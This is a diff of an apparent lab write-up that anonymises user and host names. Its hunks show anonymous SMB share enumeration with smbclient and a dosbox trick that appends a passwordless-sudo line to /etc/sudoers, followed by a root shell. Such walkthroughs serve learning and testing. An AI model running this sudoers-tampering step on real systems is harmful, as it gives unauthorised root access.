@@ -809,14 +809,14 @@ smbclient -U '%' -N \\\\$IP\\<share name> -m SMB3
 smbclient -L \\192.168.214.125 -U "" -N -p 12445
 Sharename       Type      Comment
         ---------       ----      -------
-        Commander       Disk      Dademola Files
+        Sarge       Disk      USERA Files
         IPC$            IPC       IPC Service (Samba 4.13.2)
 Reconnecting with SMB1 for workgroup listing.
 do_connect: Connection to 192.168.214.125 failed (Error NT_STATUS_IO_TIMEOUT)
 Unable to connect with SMB1 -- no workgroup available
 ````
 ````
-smbclient '//192.168.214.125/Commander' -p 12445
+smbclient '//192.168.214.125/Sarge' -p 12445
 Password for [WORKGROUP\root]:
 Anonymous login successful
 Try "help" to get a list of possible commands.
@@ -3019,7 +3019,7 @@ DOSBox version 0.74-3
 ````
 ````
 export LFILE='/etc/sudoers'
-dosbox -c 'mount c /' -c "echo commander ALL=(root) NOPASSWD: ALL >>c:$LFILE"
+dosbox -c 'mount c /' -c "echo Sarge ALL=(root) NOPASSWD: ALL >>c:$LFILE"
 
 DOSBox version 0.74-3
 Copyright 2002-2019 DOSBox Team, published under GNU GPL.
@@ -3032,7 +3032,7 @@ ALSA lib confmisc.c:1246:(snd_func_refer) error evaluating name
 ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
 ALSA lib conf.c:5231:(snd_config_expand) Evaluate error: No such file or directory
 ALSA lib pcm.c:2660:(snd_pcm_open_noupdate) Unknown PCM default
-CONFIG:Loading primary settings from config file /home/commander/.dosbox/dosbox-0.74-3.conf
+CONFIG:Loading primary settings from config file /home/Sarge/.dosbox/dosbox-0.74-3.conf
 MIXER:Can't open audio: No available audio device , running in nosound mode.
 ALSA:Can't subscribe to MIDI port (65:0) nor (17:0)
 MIDI:Opened device:none
@@ -3041,17 +3041,17 @@ SHELL:Redirect output to c:/etc/sudoers
 ````
 
 ````
-[commander@nukem ~]$ sudo -l
-Runas and Command-specific defaults for commander:
+[Sarge@example ~]$ sudo -l
+Runas and Command-specific defaults for Sarge:
     Defaults!/etc/ctdb/statd-callout !requiretty
 
-User commander may run the following commands on nukem:
+User Sarge may run the following commands on example:
     (root) NOPASSWD: ALL
 ````
 
 ````
-[commander@nukem ~]$ sudo su
-[root@nukem commander]# whoami
+[Sarge@example ~]$ sudo su
+[root@example Sarge]# whoami
 root
 ````
 #### /usr/bin/cp
